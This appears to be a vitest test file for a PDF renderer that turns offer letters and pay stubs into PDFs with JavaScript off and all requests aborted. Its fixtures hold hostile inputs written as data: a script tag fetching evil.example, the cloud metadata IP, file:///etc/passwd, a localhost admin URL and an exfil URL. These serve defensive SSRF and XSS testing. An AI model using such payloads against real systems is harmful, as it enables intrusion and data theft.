// PDF rendering (design 6.4 and 7.1): Weft templates with escaped text, loaded with setContent while JavaScript is
// off and every request is aborted (no SSRF through Browser Run), cached in R2 under a world, generation and sha256
// key, with browser time counted against the 300 s daily share. The fake browser turns every URL the HTML names, plus
// the extra URLs a hostile page could try, into request events and records whether each was aborted.
import { describe, expect, it } from "vitest";
import { pdfObjectKey } from "../../contracts/src/ext/cf-extras";
import { sha256Hex } from "../src/bytes";
import { COUNTERS, memoryDailyCounters } from "../src/counters";
import { ExtrasError } from "../src/errors";
import { cachedPdf, createDocumentRenderer, MAX_PDF_HTML_BYTES, pdfBrowserReserveMs } from "../src/pdf";
import { pdfFileName, renderPdfHtml, usd, type DocumentPdfData, type PayStubPdfData } from "../src/templates";
import { fakeBrowser, memoryR2 } from "./fakes";

const offer: DocumentPdfData = {
  kind: "offer_letter", companyName: "Larkspur Labs", documentId: "doc_0007", title: "Offer letter for Noor Castellanos",
  bodyText: "Dear Noor Castellanos,\n\n<script>fetch('https://evil.example/x')</script><img src=\"http://169.254.169.254/latest\">\nYour base pay is $142,000.00 a year.",
  sha256: "a".repeat(64), status: "sent", sentAt: "2026-10-20T16:00:00.000Z", signature: null,
};
const stub: PayStubPdfData = {
  kind: "pay_stub", companyName: "Larkspur Labs", paycheckId: "pyc_0042", payrollRunId: "pay_0007", workerName: "Lena Brooks",
  periodStart: "2026-10-01", periodEnd: "2026-10-15", payday: "2026-10-16", grossCents: 580_166, netCents: 401_233, reimbursementsCents: 41_238,
  employeeTaxesCents: 140_000, companyTaxesCents: 44_383,
  earnings: [{ label: "Salary", amountCents: 580_166 }], deductions: [{ label: "401(k)", amountCents: 29_008, detail: "pretax" }], taxes: [{ label: "Federal income tax", amountCents: 98_000, detail: "US" }],
};

describe("templates", () => {
  it("escape every value and name no external resource, so a rendered page has nothing to fetch", () => {
    for (const html of [renderPdfHtml(offer), renderPdfHtml(stub), renderPdfHtml({ ...offer, kind: "signed_agreement", signature: { signerName: "Noor Castellanos", typedName: "<b>Noor</b>", signedAt: "2026-10-21T17:00:00.000Z", documentSha256: "b".repeat(64) } })]) {
      expect(html).not.toMatch(/<script|<img|<link|<iframe|<object|<embed|src="|href="|url\(|@import/i);
      expect(html).toContain("Rendered by Weft from its own records.");
      expect(html).not.toMatch(/DEMO DOCUMENT|fictional|simulated/i);
    }
    expect(renderPdfHtml(offer)).toContain("&lt;script&gt;fetch(&#39;https://evil.example/x&#39;)&lt;/script&gt;&lt;img src=&quot;http://169.254.169.254/latest&quot;&gt;");
  });

  it("are deterministic, so the sha256 cache key is stable", async () => {
    expect(await sha256Hex(renderPdfHtml(stub))).toBe(await sha256Hex(renderPdfHtml({ ...stub, earnings: [...stub.earnings] })));
    expect(await sha256Hex(renderPdfHtml(stub))).not.toBe(await sha256Hex(renderPdfHtml({ ...stub, netCents: 401_234 })));
  });

  it("formats money from integer cents and names files by kind and id only", () => {
    expect([usd(0), usd(5), usd(123_456_789), usd(-41_238)]).toEqual(["$0.00", "$0.05", "$1,234,567.89", "-$412.38"]);
    const html = renderPdfHtml(stub);
    expect(html).toContain("$5,801.66");
    expect(html).toContain("$4,012.33");
    expect(pdfFileName("pay_stub", "pyc_0042")).toBe("weft-pay-stub-pyc_0042.pdf");
    expect(pdfFileName("offer_letter", "../doc_1")).toBe("weft-offer-letter-doc_1.pdf");
  });
});

async function setup(opts: Parameters<typeof fakeBrowser>[0] = {}) {
  const files = memoryR2();
  const clock = { t: 1_000_000 };
  const browser = fakeBrowser({ ...opts, clock });
  const counters = memoryDailyCounters();
  const blocked: string[] = [];
  const renderer = createDocumentRenderer({ files, launch: browser.launch, counters, enabled: () => true, now: () => clock.t, onBlocked: (u) => blocked.push(u) });
  return { files, browser, counters, renderer, clock, blocked };
}

describe("DocumentRenderer", () => {
  it("renders with JavaScript off and every request aborted, stores it in R2, then serves from the cache", async () => {
    const s = await setup({ extraRequests: ["http://169.254.169.254/latest/meta-data/", "http://localhost:8787/api/_admin/provision", "https://evil.example/exfil?d=1"] });
    // A page that names resources directly, as a hostile template would: none of them may load.
    const html = `${renderPdfHtml(offer)}<link rel="stylesheet" href="https://fonts.example/x.css"><img src="file:///etc/passwd">`;
    const key = { scope: "world" as const, slot: "slot-1", gen: 3, sha256: await sha256Hex(html) };
    const first = await s.renderer.render({ kind: "offer_letter", html, key });
    expect(first).toMatchObject({ objectKey: `w/slot-1/g3/pdf/${key.sha256}.pdf`, cached: false, browserMs: 3300, blockedRequests: 5 });
    expect(s.browser.log.jsEnabledAtContent).toBe(false);
    expect(s.browser.log.interceptionAtContent).toBe(true);
    expect(s.browser.log.requests).toHaveLength(5);
    expect(s.browser.log.requests.every((r) => r.aborted && !r.continued)).toBe(true);
    expect(s.blocked).toContain("http://169.254.169.254/latest/meta-data/");
    expect(s.browser.log.closed).toBe(1);
    const stored = s.files.objects.get(first.objectKey)!;
    expect(stored.contentType).toBe("application/pdf");
    expect(new TextDecoder().decode(stored.bytes.subarray(0, 5))).toBe("%PDF-");
    expect(await s.counters.peek(COUNTERS.browserMs)).toBe(3300);

    const again = await s.renderer.render({ kind: "offer_letter", html, key });
    expect(again).toMatchObject({ objectKey: first.objectKey, cached: true, browserMs: 0 });
    expect(s.browser.log.launches).toBe(1);
    expect(await cachedPdf(s.files, key)).toEqual(stored.bytes);
  });

  it("never stores one document under another's key", async () => {
    const s = await setup();
    const html = renderPdfHtml(stub);
    await expect(s.renderer.render({ kind: "pay_stub", html, key: { scope: "world", slot: "slot-1", gen: 3, sha256: "c".repeat(64) } })).rejects.toMatchObject({ code: "PDF_KEY_MISMATCH" });
    expect(s.browser.log.launches).toBe(0);
  });

  it("stops at the daily browser share and counts failed renders too", async () => {
    const s = await setup();
    await s.counters.add(COUNTERS.browserMs, 300_000);
    const html = renderPdfHtml(stub);
    const key = { scope: "world" as const, slot: "slot-2", gen: 1, sha256: await sha256Hex(html) };
    await expect(s.renderer.render({ kind: "pay_stub", html, key })).rejects.toMatchObject({ code: "PDF_BUDGET", retryable: false });
    expect(s.browser.log.launches).toBe(0);

    const f = await setup({ failPdf: true });
    const err = await f.renderer.render({ kind: "pay_stub", html, key }).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(ExtrasError);
    expect(err).toMatchObject({ code: "PDF_RENDER_FAILED", retryable: true });
    expect(f.browser.log.closed).toBe(1);
    expect(await f.counters.peek(COUNTERS.browserMs)).toBe(3300);
    expect(f.files.objects.size).toBe(0);
  });

  it("reserves a render's worst case before the browser starts, so the share is never overshot", async () => {
    expect(pdfBrowserReserveMs()).toBe(35_000);
    const s = await setup();
    // 265.1 s used: one more render could take 35 s, past the 300 s share, so it never starts.
    await s.counters.add(COUNTERS.browserMs, 265_001);
    const html = renderPdfHtml(stub);
    const key = { scope: "world" as const, slot: "slot-2", gen: 1, sha256: await sha256Hex(html) };
    await expect(s.renderer.render({ kind: "pay_stub", html, key })).rejects.toMatchObject({ code: "PDF_BUDGET" });
    expect(s.browser.log.launches).toBe(0);
    // At 265 s it starts; while it runs the counter holds the full 35 s, and the unused time comes back after.
    const t = await setup();
    await t.counters.add(COUNTERS.browserMs, 265_000);
    let during = 0;
    const r = createDocumentRenderer({ files: t.files, counters: t.counters, enabled: () => true, now: () => t.clock.t, launch: async () => { during = await t.counters.peek(COUNTERS.browserMs); return t.browser.launch(); } });
    expect(await r.render({ kind: "pay_stub", html, key })).toMatchObject({ cached: false, browserMs: 3300 });
    expect(during).toBe(300_000);
    expect(await t.counters.peek(COUNTERS.browserMs)).toBe(268_300);
    // A launch that throws still gives its reservation back down to the time it took.
    const u = await setup();
    const failing = createDocumentRenderer({ files: u.files, counters: u.counters, enabled: () => true, now: () => u.clock.t, launch: async () => { u.clock.t += 700; throw new Error("browser quota"); } });
    await expect(failing.render({ kind: "pay_stub", html, key })).rejects.toMatchObject({ code: "PDF_RENDER_FAILED", retryable: true });
    expect(await u.counters.peek(COUNTERS.browserMs)).toBe(700);
  });

  it("is off behind its kill flag but still serves what is cached; refuses oversize HTML", async () => {
    const files = memoryR2();
    const browser = fakeBrowser();
    const html = renderPdfHtml(stub);
    const key = { scope: "seed" as const, snapshot: "snap1", sha256: await sha256Hex(html) };
    const off = createDocumentRenderer({ files, launch: browser.launch, counters: memoryDailyCounters(), enabled: () => false });
    await expect(off.render({ kind: "pay_stub", html, key })).rejects.toMatchObject({ code: "PDF_DISABLED" });
    await files.put(pdfObjectKey(key), new TextEncoder().encode("%PDF-cached"));
    expect(await off.render({ kind: "pay_stub", html, key })).toMatchObject({ cached: true, objectKey: `seed/snap1/pdf/${key.sha256}.pdf` });
    const on = createDocumentRenderer({ files, launch: browser.launch, counters: memoryDailyCounters(), enabled: () => true });
    const big = "x".repeat(MAX_PDF_HTML_BYTES + 1);
    await expect(on.render({ kind: "pay_stub", html: big, key: { scope: "world", slot: "slot-1", gen: 1, sha256: await sha256Hex(big) } })).rejects.toMatchObject({ code: "PDF_TOO_LARGE" });
    expect(browser.log.launches).toBe(0);
  });
});
